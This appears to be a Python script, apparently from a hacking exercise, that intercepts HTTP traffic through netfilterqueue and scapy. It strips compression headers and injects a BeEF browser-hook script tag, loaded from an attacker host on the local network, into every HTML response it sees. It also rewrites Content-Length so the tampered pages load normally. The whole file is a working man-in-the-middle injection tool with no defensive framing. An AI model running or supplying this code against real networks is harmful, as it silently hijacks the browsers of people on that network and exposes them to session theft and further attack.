#!/usr/bin/env python3
import netfilterqueue
from scapy.layers.inet import IP, TCP
from scapy.layers.dns import Raw
from Utilities.utils import set_load
import re

def process_packet(packet):
    # alert_code = "<script>alert('Hello World!')</script>"
    beef_code = "<script src=\"http://192.168.1.72:3000/hook.js\" ></script>"
    scapy_packet= IP(packet.get_payload())
    if scapy_packet.haslayer(Raw) and scapy_packet.haslayer(TCP):
        try:
            load = scapy_packet[Raw].load.decode()
            encoding_pattern = "Accept-Encoding:.*?\\r\\n"
            content_length_pattern = "(?:Content-Length:\s)(\d*)"
            if scapy_packet[TCP].dport == 80:
                print("\n[+] HTTP Request:")
                # Strip encoding to stop GZIP compression of HTML
                load = re.sub(encoding_pattern, "", load)

            elif scapy_packet[TCP].sport == 80:
                print("\n[+] HTTP Response:\n")
                # print(scapy_packet.show())
                injection_code = beef_code
                load = load.replace("</body>", injection_code + "</body>")
                content_length_search = re.search(content_length_pattern, load)
                if content_length_search and "text/html" in load:
                    content_length = content_length_search.group(1)
                    new_content_length = int(content_length) + len(injection_code)
                    load = load.replace(content_length, str(new_content_length))

            if load != scapy_packet[Raw].load:
                new_packet = set_load(scapy_packet, load)   # Create a new packet with the modified load
                packet.set_payload(bytes(new_packet))         # Set the new packet as the main packet
        except UnicodeDecodeError:
            pass
    packet.accept()
    return None

print("\n[+] Hello World, this is Code Injector!")
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()